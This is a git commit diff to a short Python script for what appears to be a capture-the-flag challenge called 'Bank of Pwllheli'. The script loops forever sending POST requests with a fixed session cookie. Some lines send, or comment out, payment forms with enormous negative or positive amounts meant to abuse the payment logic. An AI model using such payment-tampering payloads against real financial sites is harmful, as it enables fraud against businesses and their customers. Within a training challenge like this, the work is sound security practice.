95abcb4428685ccfbe9fc5953165a3ba59f663a6
rtm516 <ryantmilner@hotmail.co.uk>
2019-11-25 18:02:31 +0000

    Added very breif stuff for 202

--- 2019/202 Bank of Pwllheli/run.py
+++ 2019/202 Bank of Pwllheli/run.py
@@ -1,16 +1,18 @@
 import requests
 import time
+import datetime
 
 while True:
-	url = "http://202.cybertrial.co.uk/account-payment"
+	url = "http://202.cybertrial.co.uk/account"
 
-	payload = "pay_amount=-10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&pay_name=N.%20Null&pay_sortcode=10-20-20&pay_account=10001218&pay_reference=Food"
+	#payload = "pay_amount=99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999&pay_name=N.%20Null&pay_sortcode=10-20-20&pay_account=10001218&pay_reference=Food"
 	headers = {
-		'Content-Type': "application/x-www-form-urlencoded",
+		#'Content-Type': "application/x-www-form-urlencoded",
 		'Cookie': "PHPSESSID=eo9qs1vp3shikcu24fjoogukma"
 	}
 
-	response = requests.request("POST", url, data=payload, headers=headers)
+	response = requests.request("POST", url, headers=headers)
 
-	print(response.text)
-	time.sleep(0.1)
+	#print(response.text)
+	print("Req " + str(datetime.datetime.now().time()))
+	time.sleep(2)
